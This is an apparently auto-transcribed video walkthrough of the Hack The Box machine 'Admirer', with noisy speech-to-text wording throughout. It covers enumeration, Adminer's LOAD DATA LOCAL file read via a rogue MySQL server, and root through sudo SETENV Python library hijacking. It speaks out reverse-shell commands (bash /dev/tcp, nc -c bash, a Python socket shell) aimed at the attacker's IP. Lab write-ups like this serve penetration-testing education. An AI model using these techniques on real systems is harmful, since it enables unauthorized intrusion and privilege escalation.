 what's going on youtube this is ipsec i'm doing admirer from hack the box which was a fun and easy box as long as you remember to put extensions with your girl buster search because there's two hidden files in two different directories that you probably won't be finding if you don't tell go buster what extensions to look for once you find those files the box becomes relatively easy the very first part is you find adminer.php which is a php script that's a database management thing and you have to log in you don't have the credentials to log in but the login prompt lets you change the sql server so you can change it back to your own server and then just give it credentials to your sql database and then you can log into the box which i really liked because there's been a few times where i've just seen like um a uncompleted install of wordpress and i was able to complete the install of wordpress by putting my database creds in and then once i completely install a wordpress i can just like modify a theme and get on the box that way but um once you get access to adminer.php you can do like a file inclusion type thing and put the index.php inside of your own database look at it get some creds in sshn and then the privesque is abusing a set environment thing in sudo which is a lot of fun so enough talking let's just jump in as always i'm going to start with the nmap but i'm going to change it up a little bit with this video because we are doing it live so i don't want nmap to take forever so show some quick optimization checks so the very first thing i'm going to do is not run any scripts we're just going to specify dash o capital a on the directory call it admirer dash quick and then 10 10 10 187 if you wanted to you could do dash p dash to do all ports and you can also add the dash v flag to show you open ports as it finds it but the main thing we wanted was just to get this output of us showing what ports are open so if i cat the nmap directory admirer quick dot nmap we can see that so i'm going to grep on open because i just want to grab these three ports and then we will do awk dash f for field separator and do slash then print dollar one so now that's going to grab these three ports and then there's a another flag we can do called ors the output record separator i believe and i'm just going to have that equal to um comma so i do single quote comma single quote and we can see it puts it like this if we wanted to we could do semicolon echo to put a line break at the end and if we really want to we could put anything in between this so um yeah so just leave it like that and grab these three ports and now we can do our standard command so nmap dash sc for default scripts sv enumerate versions oh a output all formats put in the map dragon collet admirer then the dash p flag to specify ports put the three ports and ip address which is 10 10 10 187 and we'll let this run it can take a little while but hopefully it won't take too long just specifying which ports to do the scan on we see port 21 is open so while that goes or well it finished we could have done ftp 101010.187 and just tried anonymous login and we get permission tonight so that does not work and we do see nmap telling us well it's not telling us anonymous logins allowed so we can assume it is disabled i also see it says vs ftpd version three point something if i saw this was version two i would probably start going down that exploit path if we look at search point vs ftpd we just see exploits for two dot nothing for three dots so i'm going to ignore ftp for now we do have ssh open on port 22 and its banner tells us it's a debian server and it's um debian 10 or 9. i'm guessing it's relatively up to date you normally won't find exploits within sh so i'm going to ignore that for now we do have http on port 80 it's running httpd tells us it's debian as well if this said ubuntu or some other distro i'd be thinking okay well this is using docker or some type of virtualization technology because 22 says debian 80 says something else but i think these match up so not gonna go down that path we do see the http robots.txt telling us there is a directory called slash admin dir and that's about all the information we get so let's go take a look at the site so 10 10 10 187 then i want to do 10 10 10 187 robots.txt and finally 10 10 10 187 admin to see everything we have uh admin dirt gives us forbidden so we probably want to check for files inside of this because i guess directory listing is just disabled uh robots.txt uh we have a potential username waldo uh this folder contains personal contacts and creds so no one not even robots should be able to see it so this is definitely kind of hinting at there's some type of file in it contacts and creds going to this page doesn't really look like there's anything isn't about we could try fuzzing this but my main interest right now is that directory i'm going to check if this is running php or something so i'm going to do index.php and it looks like we get this page try index html we get a 404 we could try other extensions but we know php works and that's going to be the extension i try so let's go over to go buster so go buster dio for der mode dash u for url http 101010 187 w for word list and as i said in a previous video i think it was like the last one i did i'm going to switch to using setlist instead of the one in user share i think word list turnbuster then directory list whatever uh sturbuster user whatever that was i'm not going to use directory list small or big or anything anymore i'm gonna start using the setlist one because i think this is just more up to date mainly it included a dot get folder which i would assume was in the other word list but this one has better results i think so user share set list discovery content and we'll do the raft ones so we'll try raft small words dot text and before i do that i'm going to make sure that has what i want so it would be silly to say hey i'm switching to this word list because the other one didn't include this one thing i wanted when this one doesn't as well so i'm going to grab for get on this uh on i guess specify the path so let's just grab this whole thing and get is in that so and if we check the one i used to use user share word list doorbuster directory list whatever i guess we should maybe do colon.get we don't have that at all so or maybe grip that then prep if i can type oh my god colon.get yeah so i was too lazy to figure out how to escape that period but as you can see dot get doesn't exist any of those so that's the main reason why i'm switching just because i think that's a directory we should always look for so let's go back to go buster and search for this dash o for out file i'm going to do raft small with extensions we'll do txt and php and x txt php launch that and we do have a images direct i did not put um well that's interesting but not the point of this uh we want to do admin der and admin go buster okay so let's check out what slash images is since we have that directory so slash images forbidden so anything that begins with a period it looks like we get a 403 we do have context.txt so let's go take a look at this so context.txt and that is in the admin directory and we have a few potential emails so i'm going to grab this maker let's say dub dub dub i guess and then v contacts.txt and paste so grep email off of that dash f oh we don't have to do a field separator print to emails and dot dot slash emails so looking back at our go buster it doesn't look like we have anything else so let's go what else can we look at while that runs i guess we should have increased the thread so go buster runs faster um let's see let's press ctrl u to check out the source um potential twitter handle but this looks like it's probably just for this theme and what i'm looking for now is is this wordpress anything like a cms or something we have images see we could if we really wanted to like grab this and do a w get against it and then do exif tool against the image we just grabbed so o2 so exif tool r2.jpg and look at the date where's the metadata for the date we can see it was created in 2019 uh december 2nd so we know that's when the image was uploaded to the server or something it doesn't really help us but if we saw like 2011 or something we know this is a pretty old server and could try those type of old exploits like shell shock and things like that but seeing all dates point to like 2019 or something chances are i'm not gonna go through those legacy vulnerabilities looking at this we see still under development doesn't do anything but looks nice on some type of post field since says get in touch i'm going to guess that's the contact page and it looks like all these javascript things are just standard and going back to go buster do we have anything i should have hid like four or threes so 200 i don't see anything else but there were two things that says context.txt if we looked at robots contacts and creds so i'm just going to guess that there's a creds.txt and it doesn't look like there is maybe cred credentials.tx maybe there we go so get this i'm sure go buster will find it eventually but we found credentials right away so i'm going to copy that and let's put it in the dub dub dub directory credentials.txt and let's see cat dub dub dub credentials.txt and we have wcooper at admiral.htb with that password ftp user so an ftp account this should be good and a wordpress account so there's probably wordpress somewhere um i'm just going to try wordpress and we'll try in the admin directory wordpress don't have anything wp-login.php i think is the wordpress login thing just seeing if that exists uh admin dir don't have anything so let's try sshing so ssh w dot cooper at 10 10 10 187 except the fingerprint and nothing let's try i guess we could try this admin wordpress account but let's try ftp and if we still don't get anywhere i'll probably go back to the emails that i made earlier and start trying all these users with these passwords for some type of password reuse but let's try the ftp so ftp 101010 187 uh okay i was like what did i put on my clipboard but no it's right paste it in and do a dir and we have a sql database and some html file so i'm going to do a get dump.sql get html tar gz get these two files exit and then maker ftp move these into this try to stay as organized as we can it's kind of hard to stay extremely well organized but anything does help let's go into ftp cat dump dot sql and let's take a look at this i'm just going to do vim thump dot sql and hoop it does put some type of code highlighting so we do have the version of mri db again this is debian and interesting enough this is debian 9 update 1 and i think it was like debian 9 update 4 or something on ssh so maybe this is a old dump or maybe it's just an old version of sql installed i don't know how often debian updates that um let's see we got a table and table items we got id thumb image text whatever nothing too interesting there i was looking for like passwords or something and an insert statement with a bunch of things uh let's see it's a bit hard to read that insert statement so i'm going to grip insert on dump let's copy this to the text clipboard vt and let's just do a set so we'll separate on let's do single quote comma single quote with backslash r backslash n and let's see this puts everything nicely i guess with some line breaks so it's more easily red but it doesn't look like to be anything of interest so let's go take a look at the tar file so tar x for extract v for verbose uh xj vf i think it's xz for gzip so extract gzip verbear's filename html.gz and got that correct and we have a bunch of files so maker extract move assets dump images index robots utility scripts and waldo secret directory into extract and dumps that came off ftp not that so i'm just going to put up one directory and we have index.php so take a look at this and it looks like we have some creds so i'm going to try those creds again ssh water at 10 10 10 187 it in don't have anything v dot dot dot slash creds and we should create a running list of all the crowds we have and i wish i remembered what we had before or they came out of the credentials file um let's go where is it cat www credentials v creds let's say we have w cooper at admirer.htb and it's this string for what it's worth they have decent passwords would not crack these at all http okay that ends in p next one is ftp user except when it comes to the wordpress cred that one's pretty bad but we'll see where wordpress is actually installed probably waldo secret directory so grab this and put this here okay so now we have all the creds let's go back into ftp extract v robots this looks like to be the same exact thing let's go into assets this is just the css stuff images probably images yeah um utility scripts we got admin tasks.php and so wrap that and vim so we have code highlighting c is set if task equals 1 2 3 4 whatever so it's doing shell exec and task up here we are making sure task is a number so i don't think there is anything we can do here see it's probably something we have to do with one of these since these are labeled not working which is weird to include them see not working because they need root privilege so he doesn't want to run root code on a page let's check the cron tabs so let's see utility dash scripts utility dash scripts forbidden what is this directory or with the file name admin underscore tasks dot php see uptime logged in users no one's logged in if i saw a logged in user like that was an email i tried more brute forcing of ssh to get him uh no cron tabs for dub dub dub data and i don't think we can do anything here so let's see cat db admin waldo and we've got another password to try so we can try at ssh 10 10 187 and if i started having more usernames i'd probably use crack map exec to do ssh the main reason i'm not is because i don't think my crack map exec is updated where it has all the bug fixes for ssh so uh one more actually we can just go to this pane waldo paste so let's see info.php php info so if we have like an lfi vulnerability we can probably chain that to that php info thing and we have php test so let's see what this is just to test if php works nothing there so let's go to water seeker directory uh contacts and credentials so we don't really have anything um i'm going to just try another go buster and utility scripts and that is because oxdf gave me the hint when doing this video do all the go busters because there's like a ctf like file and a ctf-like directory i don't know what one he's talking about the utility scripts or the water one i don't know if i found that but i'm guessing it's going to be in utility scripts based upon the hint so user share word list oh that's a habit uh opt set list discovery web content and we wanted raft small words dot text dash extension php and if i want to do text again i sure will do text i'm going to set threads to 50. i think default is 10. we need dirt mode i'm going to see if there's a quick way to disable that whatever the status code the only status code i want uh i'm gonna do dash b for 403. dash b 403 404 there we go so now we hid their status codes we found info.php i think we knew about that one that is php infel which i guess we can go over that to see if there's anything interesting in it so info.php and let's see we have the hostname well it's any apache version server root nothing interesting hostname of the box http host path see that's where the file is header request see allow url f open off you'll include off tons of values c type exif data tp mysql so far everything's just looking normal i don't know everything here but nothing's like standing out uh far i actually use that one i think and now i use zip i think in crime stoppers but that's a like zipping thing session we know sessions directory is inverlib php sessions xencash z lib php variables credits whatnot so nothing too interesting there uh phptest.php that one's just an echo so really just waiting on this go buster to finish i think um i interrupted this one because it was just give me a bunch of 403s hindsight i probably should let that finish i'm going to really be sad if we missed something there uh we have addminer.php so let's try that and uh login for mysql so we'll do localhost username waldo password is going to be in our credentials so actually let's go i'm getting cat creds it's always a pain copying stuff out of them so that's why i'm doing this where's waldo i should have put a note on where i got this from i know in the index.php we had a database and myra db access denied let's try this one axis denied and i guess we could try them all but it's a pain let's see well maybe this is probably looking like php my admin or something with this theme what is that minor uh database management in a single php file okay so i wonder if i can just change this up in like sqlite well again nothing i'm thinking right now um the path will be get into this and then have this do like into outfile and drop a shell in the web server so we just need to get past this authentication and see lvnp3306 10 10 14 2 please subscribe password database i guess login will you get a connection so what i'm going to do is just create my sql stuff on this computer and have it use us for authentication because i tried all the passwords i can think of for this and nothing worked so let's just give it our credentials or our server so mysql sudo service mysql start sudo mysql dash you root let's see let's create database um delete me when done then we need to create a user so let's create user ipsec at 10 10 10 187 identified by don't exploit me please because we're going to set up mysql and let it external people connect to us so i don't think this is in the word list and hopefully when um [Music] someone tries to connect and sees this they'll be kind so whenever you open up external things always be cautious and please please please never use password or password one or something like that so let's see we want to grant all on delete me when done to ipsec at 10 10 10 187 okay flush privileges and let's see if we can log in so username ipsec password this and database would delete me when done delete me when done connection refused and that is because my sequel does not listen on a routable interface so what i'm going to do is do socat tcp listen 3306 uh fork bind equals 1010 14 2 2 tcp 127.01 306. i did that correctly oh access 9 for ipsec at localhost so what i did here is i set up a um circuit listener to go on my routable interface and send it to localhost because mysql only lists a local host i normally prefer doing this method because i don't want to remember to revert a config file however what i just noticed is my server thinks i'm localhost so so cat's not telling mysql it's coming from a different interface so what we probably should do is v etsy mysql i don't know cdcmysql and let's just edit mysql so grep12701 on this directory uh dash capital r it's here so v mariadb.com 50 server.com 127.001 and hopefully i remember to revert this file sudo i mean it's one of those things that you're screwed either way either you're going to forget to revert this file and allow people to connect to mysql whenever or you're going to forget to uh or you're going to use socat and allow localhost externally and maybe like metasploit you set up a mysql user and that's a default credential that people can use to get in when you have socat so there's issues both ways the first way again um forget to change it and mysql is always listening globally other way using socat to forward that is um anything that was default at localhost and secure because there's only localhost is now vulnerable i'm going to switch to this way so sudo service mysql restart and now we should be listening on uh all interfaces so what was my password don't exploit me please and i would have used please subscribe but i mean there's other people on this lab and i don't feel like getting exploited so to give you an idea of when you should use sensitive password secure passwords so let's do select one and the sql command okay into out file temp ipsec access denied lss temp not there well i was just making sure what didn't go to my local host because we're connecting to my database so i don't know if it's running this on this server or my box so this is an easy machine so it's probably search point and miner search point add miner x copy this 431 what version are we we are not that version um let's see exploit 2019 it's january 2019 this we said was um december 2019 but this is close and we can also go to this one does this have any details i'm not seeing an exploit here see how does it work instead okay so we are actually already this one we connect back to our own my sql and they use the command load data local so file local demand okay uh let's see the latest version four seven zero or is it minor so i think it said four six three so they addressed that so 1462. so chances are this is vulnerable there is a video that is small uh let's see load data local let's go to a different page add miner so anything here this looks good okay this is the command we want load data local etsy host into table so the thing we have to do is create a table so let's go back to my sql sudo mysql and we're going to do create table use database first use database delete me when done just use delete me when done and create table we're gonna call please subscribe and we'll do output i think space text the number of characters uh let's do 4096. set the correct syntax looks like it is so let's now go back to a minor so if i just get rid of this and sql so we have the table please subscribe so we can do into table please subscribe dot output execute insert command denied for table output for table that's a column uh open baster restriction effect that's a php thing limit files accessed by php um i'm guessing they probably set that to like verb www.html i was at admirer adminder info.php this was utility scripts actually utility scripts info.php open baster yeah very www.html so you can only access files in this directory let's see maybe.htaccess so let's go back to here www.html.ht access can't find file uh the index.php actually had a database cred right uh where is index.php yeah this is what we did to get a database cred and this credential did not work so that's what i'm going to try is this file different index.php and we got to go and edit it so sudo mysql dash you root use delete me when done and select star from what was the table we created please subscribe should have guessed that one let's see that is a different password you can just tell because it's not a quote in the past when there was a quote in the other one so let's go back to our creds water like that seat water at 10 10 10 187 paste and we get in awesome let's do history nothing in here uh dot nano lsla.nano nothing user.txt stuff was in slash opt scripts backup to pi and admin tasks so admin task was related to um let's see utility scripts yeah mntask.php calls the shell script so we call it with and argument so let's look at this admin tasks.sh see the bash script there's uptime users cron tab backup password scp so let's check out our backups cd for backups everyone can read the nope not everyone can read the file uh let's do md5 sum html entire gz 7f44 md5 sum html see different html to gz that shm let's go in this directory to the xvf i cannot change you time it's fine let's see is this credential just the same yeah this is an updated credential so this one actually ran so um rf star probably hopped cd scripts vim admin tasks via admin tasks backup shadow backup web it's writing that python script so let's take a look at the python script so backup web runs this and this just does an import and makes an archive huh uh let's see let's check studer list uh we need the password creds grab his password paste and we can sudo on that file um i thought we could just because it looked like this admin task thing was ran and we had that html thing that was updated and i mean it just kind of look like it it can't be a set uid because it's a shell script set uid doesn't work on shell scripts or python scripts we have this set end which means when we do sudo we can set environment variables so this admin tasks is calling this python script and this python script is making an import so i have an idea what we do i'm going to cap this backup.pi and we're going to hijack this make archive it's using three things so let's do cd dev shm v sh util dot pi and when the backup script goes to um backup script goes to load this library it's going to load ours and ours will have a malicious version of make archive so copy paste that for reference so def make archive and we'll do just three variables abc then we want os system i and we can do import os okay so now we can do sudo and then python path is equal to dev shem so it's going to tell the application that's where a python path is and then we just do opt scripts admin tasks and we want to do backup web data which is six and did not work oh um it's running in the background so it forked at a something so let's do nclvnp9001 edit this and we'll do bash dash c then bash dash i like that dev tcp 10 10 14 2 9 000 1 0 and 1 like that six got the connection but we don't have anything is this running commands uh tcp dump dash i ton zero icmp run that with sudo what maybe lowercase i yep ping dash ping dash n1 127 does that do it no is it dash t uh dash c that's c is it ping dash c 1 10 10 14 2. how are you thinking if we just weren't getting output of commands but we're not getting anything let's see uh bsh util python reverse shell i don't know why google thinks pentest monk is a malicious site how do i oh ignore this risk okay this is a pain okay so let's see i'm going to do probably the insecure thing i wonder if i can just wrap this in the eval uh whenever i use eval i just hate myself for what i'm doing but it beats trying to fix all these line breaks 10 10 fourteen two port nine thousand one i'm gonna laugh at this actually works i don't think it's going to uh every now and then you get those crazy ideas when you want to be lazy backup web data yeah invalid syntax that's what i expected uh import socket sub process we already got os okay just fixing up the script come on almost there i forgot a thing that looks good six id ls uh let's see i'm guessing something's happening with file descriptors and even in this script we use standard file descriptors like zero one two so i'm really guessing like that's not standard n uh pssgf can we see this process python see cd proc 2918 do we have access we probably won't have access to fd yeah so let's see uh which and c and c dash each netcat has this so netcat should work because it's not hardcoding file descriptor b012 so let's do back to our vi uh we have to go back into opt scripts vi sh util nope we want to go into device hm edit this delete too many lines oh uh def was it make underscore archive a b c uh we can just not save i deleted too many lines there we go os dot system nc c bash 10 10 14 2 9 000 1. pseudo six there we go so now on the box as a root so we can go to slash root and see root.text what i want to do is see what the file descriptors are so i'm going to do ps ef ps ef grab python probably going to be the highest number so let's try 2960 proc 2960 zero cdfd two uh psef grep python ls proc 2935 fd zero one two three i'm not sure exactly what's going on why the other shells wouldn't work um when you get a connection back and there's weird behavior just try different reverse shells until until one works because since you got the connection back obviously code execution worked so yep that'll be the box hope you guys enjoyed take care and we'll see you all next week